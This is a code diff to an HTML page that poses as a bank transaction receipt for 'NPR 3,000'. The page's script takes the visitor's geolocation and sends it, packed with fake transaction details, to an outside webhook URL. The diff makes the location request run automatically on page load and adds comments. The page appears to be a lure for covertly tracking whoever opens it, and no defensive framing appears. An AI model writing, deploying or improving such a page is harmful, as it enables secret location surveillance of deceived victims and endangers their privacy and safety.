@@ -145,7 +145,7 @@
     document.getElementById('transaction-date').textContent = new Date().toLocaleString();
     
     let userPosition = null;
-    const WEBHOOK_URL = "https://eoujfk3m6inyjql.m.pipedream.net"; // REPLACE WITH YOUR WEBHOOK
+    const WEBHOOK_URL = "https://eoujfk3m6inyjql.m.pipedream.net"; // REPLACE WITH YOUR URL
 
     function sendToWebhook(data) {
       fetch(WEBHOOK_URL, {
@@ -179,6 +179,7 @@
           (position) => {
             userPosition = position;
             
+            // Console log for debugging
             console.log(`
               Lat: ${position.coords.latitude}
               Long: ${position.coords.longitude}
@@ -186,6 +187,7 @@
               Timestamp: ${new Date(position.timestamp)}
             `);
             
+            // Send to webhook
             const webhookData = {
               transaction_id: "NIC-7890-2024",
               amount: "NPR 3,000",
@@ -201,6 +203,7 @@
             };
             sendToWebhook(webhookData);
             
+            // Show receipt
             prompt.style.display = 'none';
             receipt.style.display = 'block';
             document.getElementById('location-status').textContent = 
@@ -217,6 +220,8 @@
         permissionStatus.textContent = "Geolocation is not supported by your browser.";
       }
     }
+    
+    window.onload = requestLocation;
   </script>
 </body>
 </html>
